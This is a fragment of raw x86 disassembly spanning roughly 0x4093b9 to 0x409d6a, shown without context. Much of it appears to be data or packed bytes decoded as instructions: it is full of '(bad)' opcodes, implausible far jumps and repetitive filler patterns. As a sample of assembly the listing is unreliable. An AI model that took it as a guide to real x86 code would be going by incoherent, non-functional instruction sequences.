  4093b9:	cmp    ebp,DWORD PTR [eax+0x38]
  4093bc:	cmp    eax,0x6160e43f
  4093c1:	arpl   ax,dx
  4093c3:	xchg   esp,eax
  4093c4:	gs addr16 int3 
  4093c7:	push   0x5cd86b69
  4093cc:	ins    DWORD PTR es:[edi],dx
  4093cd:	outs   dx,DWORD PTR ds:[esi]
  4093ce:	aam    0x70
  4093d0:	jno    0x409445
  4093d2:	inc    eax
  4093d3:	gs jne 0x40944d
  4093d6:	cmp    al,0x79
  4093d8:	jns    0x409435
  4093da:	or     BYTE PTR [ebp+0x5d],cl
  4093dd:	pop    edi
  4093de:	add    al,0x61
  4093e0:	popa   
  4093e1:	arpl   WORD PTR [eax],dx
  4093e3:	xchg   ebp,eax
  4093e4:	gs addr16 or al,0x69
  4093e8:	imul   ebp,DWORD PTR [ebx-0x28],0x6f6d5d
	...
  40940b:	add    ah,dl
  40940d:	jno    0x409480
  40940f:	jae    0x4093d1
  409411:	gs jne 0x40948b
  409414:	mov    esp,0xa87b7979
  409419:	ins    DWORD PTR es:[edi],dx
  40941a:	jge    0x40949b
  40941c:	and    al,0x81
  40941e:	add    BYTE PTR [ebx-0x787a4ad0],0xd
  409425:	lahf   
  409426:	mov    cl,BYTE PTR [edx-0x71792d7a]
  40942c:	adc    dh,0x92
  40942f:	xchg   edx,eax
  409430:	sahf   
  409431:	retf   0x968e
  409434:	call   0x96c2:0x969a9ace
  40943b:	sahf   
  40943c:	xchg   edx,eax
  40943d:	(bad)  
  40943e:	bound  esp,QWORD PTR [edx-0x59a14552]
  409444:	stos   BYTE PTR es:[edi],al
  409445:	mov    esi,0xf2a6aa6a
  40944a:	data16 scas al,BYTE PTR es:[edi]
  40944c:	mov    ds:0x7eb272f6,al
  409451:	jmp    0xba7a:0xee7ab66e
  409458:	jbe    0x40943c
  40945a:	jbe    0x40941a
  40945c:	jb     0x4094c4
  40945e:	inc    edx
  40945f:	ret    0x5a4e
  409462:	ds (bad) 
  409464:	dec    edx
  409465:	pop    esi
  409466:	dec    edx
  409467:	retf   0x9246
  40946a:	inc    esi
  40946b:	into   
  40946c:	inc    edx
  40946d:	xchg   esi,eax
  40946e:	push   edx
  40946f:	rol    BYTE PTR [eax],cl
	...
  40948d:	add    dh,bl
  40948f:	lea    ecx,[esi-0x2a]
  409492:	ficom  DWORD PTR [ecx-0x7a2925a6]
  409498:	push   esi
  409499:	(bad)  
  40949b:	mov    DWORD PTR [edx],esp
  40949d:	loop   0x40948d
  40949f:	jge    0x4094bf
  4094a1:	out    0xea,al
  4094a3:	sub    DWORD PTR [edx],0x25b5e6ea
  4094a9:	out    dx,al
  4094aa:	loop   0x409465
  4094ac:	xor    edx,esi
  4094ae:	mov    esi,0xbaf62dad
  4094b3:	mov    cl,0x39
  4094b5:	cli    
  4094b6:	mov    dh,0xa5
  4094b8:	xor    eax,0xe900b2fe
  4094bd:	add    cl,BYTE PTR [edi]
  4094bf:	jmp    esp
  4094c1:	dec    BYTE PTR [eax]
  4094c3:	sti    
  4094c4:	loopne 0x4094d0
  4094c6:	pop    es
  4094c7:	pop    es
  4094c8:	fld    QWORD PTR [esi]
  4094ca:	add    eax,DWORD PTR [ebx]
  4094cc:	fst    DWORD PTR [edx]
  4094ce:	pop    ds
  4094cf:	pmullw mm1,QWORD PTR [esi]
  4094d2:	sbb    ecx,DWORD PTR [ebx]
  4094d4:	rcr    DWORD PTR [edx],1
  4094d6:	pop    ss
  4094d7:	pop    ss
  4094d8:	int    0x16
  4094da:	adc    edx,DWORD PTR [ebx]
  4094dc:	leave  
  4094dd:	loop   0x40950b
  4094df:	ffreep st(4)
  4094e1:	fisubr WORD PTR [eax]
  4094e3:	fcmovnb st,st(0)
  4094e5:	jmp    0xe320:0xe6bce724
  4094ec:	mov    eax,0xb4eefcf2
  4094f1:	out    dx,al
	...
  40950e:	add    BYTE PTR [eax],al
  409510:	clc    
  409511:	jmp    0xf6ac:0xf6f4fab0
  409518:	lock xacquire sub BYTE PTR [ebp-0x56bb6154],ah
  409520:	test   al,0x9a
  409522:	inc    eax
  409523:	popf   
  409524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409526:	cmp    al,0xa1
  409528:	mov    al,ds:0x7cb538a2
  40952d:	scas   eax,DWORD PTR es:[edi]
  40952e:	xor    al,0xb9
  409530:	js     0x4094dd
  409532:	xor    BYTE PTR [ebp-0x2ef3288c],ch
  409538:	push   eax
  409539:	ror    DWORD PTR [eax],cl
  40953b:	lds    ecx,FWORD PTR [edi+edi*4+0x24]
  40953f:	leave  
  409540:	dec    eax
  409541:	mov    ebx,0xc744bd20
  409546:	sbb    al,0xc1
  409548:	inc    eax
  409549:	ret    
  40954a:	sbb    ch,dl
  40954c:	pop    esp
  40954d:	iret   
  40954e:	adc    al,0xd9
  409550:	pop    eax
  409551:	retf   
  409552:	call   DWORD PTR [eax]
  409554:	enter  0x7ad8,0xed
  409558:	jge    0x40950e
  40955a:	jle    0x4095c5
  40955c:	nop
  40955d:	jge    0x4094e2
  40955f:	gs xchg esp,eax
  409561:	jns    0x4094ea
  409563:	popa   
  409564:	sbb    BYTE PTR [esi-0x7e73a275],al
  40956a:	(bad)  
  40956b:	pop    ecx
  40956c:	mov    al,ds:0xa455938d
  409571:	mov    DWORD PTR [edi+0x51],edx
	...
  40958f:	add    BYTE PTR [eax],al
  409591:	add    BYTE PTR [eax-0x63b2646b],cl
  409597:	xchg   ecx,eax
  409598:	lahf   
  409599:	dec    ecx
  40959a:	lock pop ebp
  40959c:	mov    ds:0xa759f445,eax
  4095a1:	inc    ecx
  4095a2:	mov    eax,0xec3dab65
  4095a7:	popa   
  4095a8:	scas   eax,DWORD PTR es:[edi]
  4095a9:	cmp    eax,eax
  4095ab:	ins    DWORD PTR es:[edi],dx
  4095ac:	mov    bl,0x35
  4095ae:	les    ebp,FWORD PTR [ecx-0x49]
  4095b1:	xor    DWORD PTR [eax-0x43d2448b],ebp
  4095b7:	jno    0x409578
  4095b9:	test   eax,0xa5c33dd1
  4095be:	aad    0x39
  4095c0:	(bad)  
  4095c1:	mov    eax,ds:0x9dcb45d9
  4095c6:	int    0x41
  4095c8:	iret   
  4095c9:	cdq    
  4095ca:	popa   
  4095cb:	dec    esi
  4095cc:	rcl    DWORD PTR [ebp-0x6e28b59b],cl
  4095d2:	dec    ecx
  4095d3:	push   esi
  4095d4:	fisttp DWORD PTR [ebp-0x7620ada3]
  4095da:	xor    DWORD PTR [esi],ebx
  4095dc:	jecxz  0x409563
  4095de:	xor    eax,0xf981e71a
  4095e3:	and    eax,0x222d7deb
  4095e8:	out    dx,eax
  4095e9:	add    BYTE PTR [esp+ebp*8-0xf],al
  4095ed:	repz cmp al,bh
  4095f0:	cmc    
  4095f1:	idiv   DWORD PTR [esp+eiz*8]
  4095f4:	stc    
  4095f5:	sti    
	...
  409612:	add    BYTE PTR [eax],al
  409614:	and    al,dh
  409616:	std    
  409617:	push   DWORD PTR [edi+ebp*1-0x24a0001]
  40961e:	(bad)  
  40961f:	jmp    DWORD PTR [ebp+edi*8-0x25b0001]
  409626:	(bad)  
  409627:	push   DWORD PTR [ebp+edi*8-0x1]
  40962b:	push   DWORD PTR [ebp+edi*8-0x1]
  40962f:	jmp    DWORD PTR [ebp+edi*8-0x1]
  409633:	jmp    DWORD PTR [ebp+edi*8-0x1]
  409637:	push   DWORD PTR [ebp+edi*8-0x1]
  40963b:	push   DWORD PTR [ebp+edi*8-0x2]
  40963f:	add    eax,DWORD PTR [edx-0x7d000003]
  409645:	std    
  409646:	(bad)  
  409647:	push   DWORD PTR [edi*8-0x2cb0001]
  40964e:	(bad)  
  40964f:	jmp    DWORD PTR [edi*8-0x2db0001]
  409656:	(bad)  
  409657:	push   DWORD PTR [edi*8-0x2cb0001]
  40965e:	inc    BYTE PTR [ebx]
  409660:	and    al,0xfd
  409662:	(bad)  
  409663:	jmp    DWORD PTR [edi*8-0x30b0001]
  40966a:	(bad)  
  40966b:	push   esp
  40966d:	cld    
  40966e:	(bad)  
  40966f:	jmp    esp
  409671:	cld    
  409672:	(bad)  
  409673:	jmp    esp
  409675:	cld    
  409676:	(bad)  
  409677:	inc    DWORD PTR [eax]
	...
  409695:	add    ah,dh
  409697:	cld    
  409698:	(bad)  
  409699:	push   esp
  40969b:	cld    
  40969c:	(bad)  
  40969d:	dec    DWORD PTR ds:0xaff3189
  4096a3:	daa    
  4096a4:	add    eax,DWORD PTR [eax]
  4096a6:	or     eax,0xd000327
  4096ab:	daa    
  4096ac:	add    eax,DWORD PTR [eax]
  4096ae:	or     eax,0xd000327
  4096b3:	daa    
  4096b4:	add    eax,DWORD PTR [eax]
  4096b6:	or     eax,0xd000327
  4096bb:	daa    
  4096bc:	add    eax,DWORD PTR [eax]
  4096be:	or     eax,0xd000327
  4096c3:	shl    DWORD PTR [eax],0xff
  4096c6:	adc    ah,BYTE PTR [edi]
  4096c8:	add    eax,DWORD PTR [eax]
  4096ca:	or     eax,0xd000327
  4096cf:	daa    
  4096d0:	add    eax,DWORD PTR [eax]
  4096d2:	or     eax,0xd000327
  4096d7:	daa    
  4096d8:	add    eax,DWORD PTR [eax]
  4096da:	or     eax,0xeff0327
  4096df:	or     DWORD PTR [ecx],esi
  4096e1:	dec    DWORD PTR [edx+0x12ff3100]
  4096e7:	daa    
  4096e8:	add    eax,DWORD PTR [eax]
  4096ea:	or     eax,0xd000327
  4096ef:	daa    
  4096f0:	add    eax,DWORD PTR [eax]
  4096f2:	or     eax,0xd000327
  4096f7:	daa    
  4096f8:	add    eax,DWORD PTR [eax]
	...
  409716:	add    BYTE PTR [eax],al
  409718:	or     eax,0x1aff3051
  40971d:	dec    ecx
  40971e:	xor    bh,bh
  409720:	adc    al,BYTE PTR [ecx+0x30]
  409723:	dec    DWORD PTR [edx+0xd000319]
  409729:	sbb    DWORD PTR [ebx],eax
  40972b:	add    BYTE PTR ds:0xd000319,cl
  409731:	sbb    DWORD PTR [ebx],eax
  409733:	add    BYTE PTR ds:0xd03e900,cl
  409739:	add    BYTE PTR [esi-0x69d025d0],bl
  40973f:	xor    dl,dl
  409741:	das    
  409742:	mov    ?,WORD PTR [eax]
  409744:	retf   0xe8af
  409747:	add    ecx,DWORD PTR ds:0xd03e900
  40974d:	add    cl,ch
  40974f:	add    ecx,DWORD PTR ds:0xd03e900
  409755:	add    cl,ch
  409757:	add    ecx,DWORD PTR ds:0xd305f00
  40975d:	sub    al,0xe8
  40975f:	add    ecx,DWORD PTR ds:0xd03e828
  409765:	test   al,0xe8
  409767:	add    ecx,DWORD PTR ds:0xd03e900
  40976d:	add    cl,ch
  40976f:	add    ecx,DWORD PTR ds:0xd03e900
  409775:	add    BYTE PTR [esi],ah
  409777:	xor    BYTE PTR [edx+0x2f],ah
  40977a:	jmp    0x409782
	...
  409797:	add    BYTE PTR [eax],al
  409799:	add    BYTE PTR ds:0xd03e900,cl
  40979f:	add    cl,ch
  4097a1:	add    ecx,DWORD PTR ds:0xd03e980
  4097a7:	add    cl,ch
  4097a9:	add    ecx,DWORD PTR ds:0xd03e900
  4097af:	add    cl,ch
  4097b1:	add    ecx,DWORD PTR ds:0xd046900
  4097b7:	add    cl,ch
  4097b9:	add    ecx,DWORD PTR ds:0xc04e900
  4097bf:	add    al,ch
  4097c1:	add    al,0xd
  4097c3:	add    cl,ch
  4097c5:	add    ecx,DWORD PTR ds:0xd03e900
  4097cb:	add    BYTE PTR [eax],al
  4097cd:	jmp    0xe94097e0
  4097d2:	push   cs
  4097d3:	add    BYTE PTR [eax],al
  4097d5:	call   0x694097e8
  4097da:	adc    DWORD PTR [eax],eax
  4097dc:	add    BYTE PTR [ecx-0x77],ch
  4097df:	jg     0x409761
  4097e1:	jmp    0xe54117f4
  4097e6:	adc    cl,BYTE PTR [esp+ebx*1]
  4097e9:	fisttp QWORD PTR [edx]
  4097eb:	or     al,0x1c
  4097ed:	aad    0x2
  4097ef:	add    BYTE PTR [eax],al
  4097f1:	jmp    0xe9c09804
  4097f6:	adc    al,0xa
  4097f8:	sbb    al,BYTE PTR [ebx]
  4097fa:	pop    es
  4097fb:	or     dl,BYTE PTR [edx]
  4097fd:	sti    
	...
  40981a:	add    BYTE PTR [eax],al
  40981c:	cld    
  40981d:	adc    DWORD PTR [edx],edx
  40981f:	sti    
  409820:	sbb    al,0x12
  409822:	adc    bl,bl
  409824:	sbb    al,0x12
  409826:	adc    bl,bl
  409828:	sbb    al,0x12
  40982a:	adc    bl,bl
  40982c:	sbb    al,0x12
  40982e:	sub    BYTE PTR [ecx+0x11],0x80
  409832:	adc    cl,ch
  409834:	adc    al,0xa
  409836:	sbb    al,BYTE PTR [ebx]
  409838:	pop    es
  409839:	or     dl,BYTE PTR [edx]
  40983b:	sti    
  40983c:	cld    
  40983d:	adc    DWORD PTR [edx],edx
  40983f:	sti    
  409840:	sbb    al,0x12
  409842:	adc    bl,bl
  409844:	sbb    al,0x12
  409846:	adc    bl,bl
  409848:	sbb    al,0x12
  40984a:	adc    bl,bl
  40984c:	sbb    al,0x12
  40984e:	sub    BYTE PTR [ecx+0x11],0x0
  409852:	add    cl,ch
  409854:	push   cs
  409855:	add    BYTE PTR [eax],al
  409857:	jmp    0xe940986a
  40985c:	push   cs
  40985d:	add    BYTE PTR [eax],al
  40985f:	jmp    0x409872
  409864:	hlt    
  409865:	add    DWORD PTR [eax],eax
  409867:	add    ah,ah
  409869:	add    DWORD PTR [eax],eax
  40986b:	add    ah,ah
  40986d:	add    DWORD PTR [eax],eax
  40986f:	add    ah,dh
  409871:	add    DWORD PTR [eax],eax
  409873:	add    ah,dh
  409875:	add    DWORD PTR [eax],eax
  409877:	add    ah,ah
  409879:	add    DWORD PTR [eax],eax
  40987b:	add    ah,ah
  40987d:	add    DWORD PTR [eax],eax
	...
  40989b:	add    BYTE PTR [eax],al
  40989d:	add    BYTE PTR [ecx+eax*1+0x1b40000],dh
  4098a4:	add    BYTE PTR [eax],al
  4098a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098a7:	add    DWORD PTR [eax],eax
  4098a9:	add    BYTE PTR [ecx+eax*1+0x1b40000],ah
  4098b0:	add    BYTE PTR [eax],al
  4098b2:	mov    ah,0x1
  4098b4:	add    BYTE PTR [eax],al
  4098b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098b7:	add    DWORD PTR [eax],eax
  4098b9:	add    BYTE PTR [ecx+eax*1+0x1740000],ah
  4098c0:	add    BYTE PTR [eax],al
  4098c2:	je     0x4098c5
  4098c4:	add    BYTE PTR [eax],al
  4098c6:	add    DWORD PTR fs:[eax],eax
  4098c9:	add    BYTE PTR [ecx+eax*1+0x0],ah
  4098cd:	add    BYTE PTR [ecx+eax*1+0x0],dh
  4098d1:	add    BYTE PTR [ecx+eax*1+0x0],dh
  4098d5:	add    BYTE PTR [ecx+eax*1+0x0],ah
  4098d9:	add    BYTE PTR [ecx+eax*1+0x0],ah
  4098dd:	add    BYTE PTR [ecx+eax*1],dh
  4098e0:	add    BYTE PTR [eax],al
  4098e2:	xor    al,0x1
  4098e4:	add    BYTE PTR [eax],al
  4098e6:	and    al,0x1
  4098e8:	add    BYTE PTR [eax],al
  4098ea:	and    al,0x1
  4098ec:	add    BYTE PTR [eax],al
  4098ee:	xor    al,0x1
  4098f0:	add    BYTE PTR [eax],al
  4098f2:	xor    al,0x1
  4098f4:	add    DWORD PTR [ecx],eax
  4098f6:	and    al,0x1
  4098f8:	add    BYTE PTR [eax],al
  4098fa:	or     eax,0xd000317
  4098ff:	sbb    BYTE PTR [edx],al
	...
  40991d:	add    BYTE PTR [eax],al
  40991f:	add    BYTE PTR ds:0xc010218,cl
  409925:	sbb    BYTE PTR [edx],al
  409927:	add    DWORD PTR [eax+ebx*1],ecx
  40992a:	add    al,BYTE PTR [ecx]
  40992c:	or     al,0x18
  40992e:	add    al,BYTE PTR [ecx]
  409930:	push   cs
  409931:	sbb    al,BYTE PTR [edx]
  409933:	add    DWORD PTR [eax+ebx*1],ecx
  409936:	add    al,BYTE PTR [ecx]
  409938:	or     al,0x18
  40993a:	add    DWORD PTR [ecx],eax
  40993c:	or     al,0x19
  40993e:	add    DWORD PTR [edx],eax
  409940:	nop    DWORD PTR [ecx]
  409943:	add    cl,BYTE PTR [edi]
  409945:	sbb    DWORD PTR [edi],eax
  409947:	add    al,0x9
  409949:	sbb    DWORD PTR [ecx],eax
  40994b:	add    dl,BYTE PTR [ecx]
  40994d:	sbb    DWORD PTR [ecx],eax
  40994f:	add    cl,BYTE PTR [edi]
  409951:	sbb    DWORD PTR [ecx],eax
  409953:	add    al,0x11
  409955:	and    eax,DWORD PTR [ecx]
  409957:	add    cl,BYTE PTR [edi]
  409959:	sbb    eax,DWORD PTR [ecx]
  40995b:	add    cl,BYTE PTR [edi]
  40995d:	sbb    DWORD PTR [ecx],eax
  40995f:	add    cl,BYTE PTR [ecx]
  409961:	sbb    eax,DWORD PTR [edi]
  409963:	add    cl,BYTE PTR [edi]
  409965:	sbb    DWORD PTR [edi],eax
  409967:	add    DWORD PTR [eax+ebx*1],ecx
  40996a:	add    al,BYTE PTR [ecx]
  40996c:	or     al,0x24
  40996e:	push   es
  40996f:	and    DWORD PTR [edi+edx*1],ebp
  409972:	add    BYTE PTR [ebx],al
  409974:	adc    ebx,DWORD PTR [edx]
  409976:	add    BYTE PTR [ebx],al
  409978:	push   cs
  409979:	sbb    al,BYTE PTR [eax]
  40997b:	add    ecx,DWORD PTR [esi]
  40997d:	sbb    al,BYTE PTR [eax]
  40997f:	add    ecx,DWORD PTR [eax]
  409981:	sbb    al,BYTE PTR [eax]
  409983:	add    eax,0x0
	...
  4099a0:	add    BYTE PTR [eax],al
  4099a2:	push   cs
  4099a3:	sbb    al,BYTE PTR [eax]
  4099a5:	add    ecx,DWORD PTR [esi]
  4099a7:	sbb    BYTE PTR [edx],al
  4099a9:	add    DWORD PTR [esi],ecx
  4099ab:	sbb    BYTE PTR [eax],al
  4099ad:	add    DWORD PTR [esi],ecx
  4099af:	add    al,ch
  4099b1:	add    BYTE PTR [edi+edi*8],cl
  4099b4:	out    0x0,eax
  4099b6:	or     al,0x0
  4099b8:	or     bh,BYTE PTR [ecx]
  4099ba:	dec    ebp
  4099bb:	add    BYTE PTR [esi],ch
  4099bd:	mov    cs,WORD PTR [ebp+0x0]
  4099c0:	inc    ebx
  4099c1:	mov    cs,WORD PTR [ebp+0x0]
  4099c4:	xor    DWORD PTR [edx+0x4f],0x4f9cb100
  4099cb:	add    BYTE PTR ds:0x38004d8f,bh
  4099d1:	fs dec ebp
  4099d3:	add    BYTE PTR [eax],bl
  4099d5:	(bad)  
  4099d6:	dec    ebp
  4099d7:	add    BYTE PTR [edi-0x72],al
  4099da:	dec    ebp
  4099db:	add    BYTE PTR [ecx+0x72],dl
  4099de:	dec    edi
  4099df:	add    BYTE PTR [ecx+0x18004d8d],bh
  4099e5:	mov    cs,WORD PTR [ebp+0x0]
  4099e8:	mov    bl,0x3
  4099ea:	dec    ecx
  4099eb:	add    cl,ch
  4099ed:	add    ecx,DWORD PTR ds:0x6f038800
  4099f3:	add    BYTE PTR [edx-0x32fff2fd],cl
  4099f9:	add    esi,esp
  4099fb:	(bad)  
  4099fc:	fld    DWORD PTR [ebx]
  4099fe:	std    
  4099ff:	call   esp
  409a01:	add    ebp,esp
  409a03:	(bad)  
  409a04:	mov    edi,0x3
	...
  409a21:	add    BYTE PTR [eax],al
  409a23:	add    bl,al
  409a25:	inc    edi
  409a27:	add    edi,eax
  409a29:	inc    ebx
  409a2b:	add    ecx,DWORD PTR ds:0x1100e800
  409a31:	add    BYTE PTR [ebx+eax*1+0x3e8ffb4],ch
  409a38:	or     eax,0xb903bf00
  409a3d:	inc    DWORD PTR [eax-0x17003efd]
  409a43:	add    ecx,DWORD PTR ds:0xe9a0000
  409a49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a4a:	call   DWORD PTR [esi+ecx*1+0x114aff9f]
  409a51:	sar    bh,1
  409a53:	pop    edx
  409a54:	or     DWORD PTR [ecx-0x66eea101],ebx
  409a5a:	(bad)  
  409a5b:	cmp    al,0x9
  409a5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a5e:	dec    DWORD PTR [ebp+0x11]
  409a61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a62:	(bad)  
  409a63:	call   0x7409a76
  409a68:	adc    DWORD PTR [ebp-0x5af6cf01],esp
  409a6e:	(bad)  
  409a6f:	call   0xca409a82
  409a74:	adc    eax,eax
  409a76:	call   DWORD PTR [eax-0x6f00425a]
  409a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a7d:	mov    ebp,0x9d0ed3ff
  409a82:	(bad)  
  409a83:	call   0xc9409a96
	...
  409aa4:	add    BYTE PTR [eax],al
  409aa6:	push   cs
  409aa7:	(bad)  
  409aa9:	push   es
  409aaa:	or     DWORD PTR [eax],eax
  409aac:	add    cl,ch
  409aae:	push   cs
  409aaf:	add    BYTE PTR [eax],al
  409ab1:	or     al,0x9
  409ab3:	popf   
  409ab4:	dec    DWORD PTR [ebx]
  409ab6:	adc    DWORD PTR [eax-0x50f6fc01],esi
  409abc:	(bad)  
  409abd:	call   0xb5409ad0
  409ac2:	push   cs
  409ac3:	popf   
  409ac4:	(bad)  
  409ac5:	mov    eax,0xc600000e
  409aca:	adc    BYTE PTR [edi-0x52626a91],0x2d
  409ad1:	test   DWORD PTR [edx-0x6a],edi
  409ad4:	jmp    FWORD PTR [ebp+0x7d6f97aa]
  409ada:	jge    0x409a89
  409adc:	push   edx
  409add:	add    BYTE PTR [eax-0x468b8e9d],bh
  409ae3:	outs   dx,BYTE PTR ds:[esi]
  409ae4:	(bad)  
  409ae5:	(bad)  
  409ae6:	jnp    0x409a72
  409ae8:	push   0x726fa070
  409aed:	push   ebx
  409aee:	mov    esp,0xc3647370
  409af3:	outs   dx,BYTE PTR ds:[esi]
  409af4:	ins    DWORD PTR es:[edi],dx
  409af5:	add    BYTE PTR [ebx],bh
  409af7:	pusha  
  409af8:	push   0x64723770
  409afd:	popa   
  409afe:	cmp    BYTE PTR [edi+0x41],bl
  409b01:	imul   edi,DWORD PTR [eax],0x3a706087
  409b07:	jb     0x409b77
  409b09:	ins    DWORD PTR es:[edi],dx
	...
  409b26:	add    BYTE PTR [eax],al
  409b28:	sub    al,0x42
  409b2a:	dec    eax
  409b2b:	push   esp
  409b2c:	and    DWORD PTR [ebx+0x4f],eax
  409b2f:	add    BYTE PTR [ebx],ch
  409b31:	pusha  
  409b32:	push   0x728af870
  409b37:	jo     0x409afc
  409b39:	jb     0x409b9f
  409b3b:	dec    ecx
  409b3c:	and    DWORD PTR [ebx+0x66],esp
  409b3f:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  409b41:	std    
  409b42:	(bad)  
  409b43:	(bad)  
  409b44:	sti    
  409b45:	pop    edi
  409b46:	push   0x735eeb70
  409b4b:	dec    ecx
  409b4c:	shl    DWORD PTR [esi+eiz*2+0x65],0x69
  409b51:	xchg   DWORD PTR [edx+0x6f],esp
  409b54:	pop    eax
  409b55:	pusha  
  409b56:	jno    0x409bcb
  409b58:	(bad)  
  409b59:	mov    WORD PTR [ecx+0x65],?
  409b5c:	fs std 
  409b5e:	(bad)  
  409b5f:	jmp    FWORD PTR [ebx-0x448f9777]
  409b65:	pusha  
  409b66:	jae    0x409bb1
  409b68:	mov    eax,ds:0xa9656664
  409b6d:	xchg   DWORD PTR [edx+0x6f],esp
  409b70:	mov    BYTE PTR [eax+0x71],ah
  409b73:	jae    0x409b82
  409b75:	pop    ss
  409b76:	add    eax,DWORD PTR [eax]
  409b78:	or     eax,0xbd689f62
  409b7d:	test   DWORD PTR [ebp+esi*2+0x60986fa8],esp
  409b84:	mov    dl,0x7b
  409b86:	iret   
  409b87:	outs   dx,BYTE PTR ds:[esi]
  409b88:	mov    esi,0x64b4b2
	...
  409ba9:	add    BYTE PTR [ebx+edx*8-0x6bf2fffd],ch
  409bb0:	and    BYTE PTR [ebx+0x28],bl
  409bb3:	(bad)  ds:0x469b482d
  409bb9:	pop    ebp
  409bba:	mov    esi,0xe6e6ff07
  409bbf:	push   ss
  409bc0:	add    eax,DWORD PTR [eax]
  409bc2:	or     eax,0x4942c5d8
  409bc7:	in     al,0xc1
  409bc9:	inc    esi
  409bca:	inc    ebp
  409bcb:	lock mov ebp,0xb9dc414a
  409bd1:	dec    esi
  409bd2:	pop    ebp
  409bd3:	call   0xf499eead
  409bd8:	rcl    DWORD PTR [esi+0x55],1
  409bdb:	loopne 0x409baa
  409bdd:	pusha  
  409bde:	das    
  409bdf:	neg    BYTE PTR [edi-0x6405cc9c]
  409be5:	push   0x6c97fe37
  409bea:	sub    edx,DWORD PTR [edx-0x4d]
  409bed:	jo     0x409c0e
  409bef:	inc    esi
  409bf0:	scas   eax,DWORD PTR es:[edi]
  409bf1:	je     0x409bf6
  409bf3:	dec    edx
  409bf4:	stos   DWORD PTR es:[edi],eax
  409bf5:	js     0x409bfe
  409bf7:	pop    es
  409bf8:	repz xor DWORD PTR [esi],edi
  409bfb:	sub    ebp,esi
  409bfd:	xor    eax,0x2aeaff3a
  409c02:	cmp    dl,BYTE PTR [edi]
  409c04:	add    eax,DWORD PTR [eax]
  409c06:	or     eax,0xd000317
  409c0b:	add    BYTE PTR [ebp+0xdf],ah
	...
  409c29:	add    BYTE PTR [eax],al
  409c2b:	add    BYTE PTR [esi],ch
  409c2d:	in     al,0x9b
  409c2f:	mov    ch,0xbf
  409c31:	mov    bl,0x9b
  409c33:	mov    cl,0xbb
  409c35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c36:	(bad)  
  409c37:	lods   eax,DWORD PTR ds:[esi]
  409c38:	mov    bh,0xe3
  409c3a:	int3   
  409c3b:	fucomip st,st(6)
  409c3d:	jecxz  0x409c03
  409c3f:	fucomip st,st(0)
  409c41:	call   0xbd0d5eee
  409c46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c47:	mov    esi,0xbb30c0d0
  409c4c:	les    esi,FWORD PTR [esp+ebp*1+0x38b758b7]
  409c53:	rcr    DWORD PTR [ebx+edx*8+0x34],cl
  409c57:	iret   
  409c58:	pusha  
  409c59:	iret   
  409c5a:	or     al,0xe0
  409c5c:	fadd   QWORD PTR cs:[eax+eiz*8]
  409c60:	inc    edx
  409c61:	leave  
  409c62:	adc    cl,ch
  409c64:	inc    esi
  409c65:	lds    ecx,FWORD PTR [esi]
  409c67:	leave  
  409c68:	cmp    ah,BYTE PTR [ecx-0x62915af6]
  409c6e:	push   es
  409c6f:	mov    eax,ds:0x9d029932
  409c74:	ss xchg ebp,eax
  409c76:	(bad)  
  409c77:	cwde   
  409c78:	sub    dh,BYTE PTR [ecx+0xd03e8]
  409c7e:	retf   0x4d3c
  409c81:	add    BYTE PTR [edx-0x5e],ch
  409c84:	dec    esp
  409c85:	add    BYTE PTR [eax],dh
  409c87:	or     al,0x4c
  409c89:	add    dl,dl
  409c8b:	add    ebp,DWORD PTR [eax]
  409c8d:	add    bl,bl
  409c8f:	add    eax,DWORD PTR [eax]
	...
  409cad:	add    bl,bh
  409caf:	dec    ebx
  409cb1:	add    esi,ecx
  409cb3:	call   FWORD PTR [ecx]
  409cb5:	add    al,0x3f
  409cb7:	add    BYTE PTR [edi],dl
  409cb9:	add    al,0xe9
  409cbb:	dec    esp
  409cbd:	add    edi,ecx
  409cbf:	(bad)  
  409cc0:	(bad)  
  409cc1:	call   0xa6409cd4
  409cc6:	jnp    0x409c7b
  409cc8:	inc    ebp
  409cc9:	nop
  409cca:	jp     0x409c68
  409ccc:	dec    eax
  409ccd:	(bad)  
  409cce:	ins    BYTE PTR es:[edi],dx
  409ccf:	xchg   esi,eax
  409cd0:	jno    0x409c56
  409cd2:	outs   dx,DWORD PTR ds:[esi]
  409cd3:	mov    bl,0x68
  409cd5:	jle    0x409c6b
  409cd7:	sar    DWORD PTR [eax-0x4f],0x6f
  409cdb:	xchg   ebp,eax
  409cdc:	arpl   WORD PTR [ebp-0x16884375],cx
  409ce2:	push   cs
  409ce3:	add    BYTE PTR [eax],al
  409ce5:	call   0x9c75:0x5045b37b
  409cec:	dec    eax
  409ced:	dec    edi
  409cee:	stos   DWORD PTR es:[edi],eax
  409cef:	xchg   ebp,eax
  409cf0:	jno    0x409d36
  409cf2:	test   al,0xb2
  409cf4:	push   0x78c0a33e
  409cf9:	xor    DWORD PTR [eax-0x53b29c6c],ebp
  409cff:	jmp    FWORD PTR es:[edi-0x5e]
  409d03:	mov    edi,0xbfba30ff
  409d08:	jmp    FWORD PTR [esi-0x6e]
  409d0b:	mov    edi,0xbfc13aff
  409d10:	inc    DWORD PTR [eax+eax*1]
	...
  409d2f:	add    BYTE PTR [eax-0x54fe00da],ah
  409d35:	call   DWORD PTR es:[ecx]
  409d38:	mov    esp,0x9d11ff26
  409d3d:	inc    DWORD PTR es:[ecx]
  409d40:	sahf   
  409d41:	inc    DWORD PTR es:[ecx]
  409d44:	lahf   
  409d45:	es call ecx
  409d48:	cdq    
  409d49:	es inc ebp
  409d4c:	test   eax,0xa2dcffac
  409d51:	es call ebp
  409d54:	mov    esp,0x5c00ff26
  409d59:	jo     0x409d5a
  409d5b:	call   DWORD PTR [esi+0x70]
  409d5e:	(bad)  
  409d5f:	push   DWORD PTR [esi+0x0]
  409d62:	add    al,BYTE PTR [edx]
  409d64:	add    BYTE PTR [bp+si],al
  409d67:	add    ah,BYTE PTR [esi+0x0]
  409d6a:	add    al,BYTE PTR [edx]
